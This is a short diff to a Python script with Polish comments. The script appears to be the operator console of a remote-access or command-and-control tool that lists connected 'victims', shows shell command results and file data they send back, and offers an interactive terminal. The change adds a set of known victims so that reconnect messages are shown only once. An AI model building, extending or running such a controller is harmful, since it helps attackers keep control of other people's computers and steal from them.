@@ -23,6 +23,7 @@ ws_global = None
 current_target = None  # aktualnie wybrany victim
 expecting_file = False  # czy czekamy na dane binarne od victima
 terminal_mode = False   # czy jesteśmy w trybie interaktywnego terminala
+known_victims = set()   # victimi których już widzieliśmy (debounce)
 
 
 def print_help():
@@ -86,10 +87,16 @@ def listener_thread(ws):
                     print("\n  [📋] Brak podłączonych victimów")
 
             elif msg_type == "victim_connected":
-                print(f"\n  [+] Victim podłączony: {data.get('id')}")
+                vid = data.get('id', '?')
+                if vid not in known_victims:
+                    known_victims.add(vid)
+                    print(f"\n  [+] Victim podłączony: {vid}")
+                # Jeśli już znany — cicho (debounce reconnect spamu)
 
             elif msg_type == "victim_disconnected":
-                print(f"\n  [-] Victim rozłączony: {data.get('id')}")
+                vid = data.get('id', '?')
+                known_victims.discard(vid)
+                print(f"\n  [-] Victim rozłączony: {vid}")
 
             elif msg_type == "shell_result":
                 print(f"\n  [💻] Wynik ({data.get('from', '?')}):")
@@ -139,7 +146,10 @@ def listener_thread(ws):
                 continue
 
             elif msg_type == "hello":
-                print(f"\n  [ℹ] Victim info: {data}")
+                vid = data.get('id', '?')
+                if vid not in known_victims:
+                    known_victims.add(vid)
+                    print(f"\n  [ℹ] Victim info: {data}")
 
             elif msg_type == "error":
                 print(f"\n  [❌] Błąd: {data.get('msg')}")
